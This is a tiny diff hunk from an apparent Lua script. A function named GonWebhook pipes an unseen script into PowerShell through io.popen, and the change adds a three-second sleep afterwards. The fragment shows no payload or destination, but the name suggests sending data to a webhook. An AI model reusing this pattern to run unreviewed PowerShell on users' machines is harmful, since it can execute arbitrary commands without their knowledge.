@@ -43,6 +43,7 @@ function GonWebhook(Winter)
     local pipe = io.popen("powershell -command -", "w")
     pipe:write(script)
     pipe:close()
+    sleep(3000)
 end
 
 function join(a,b) 
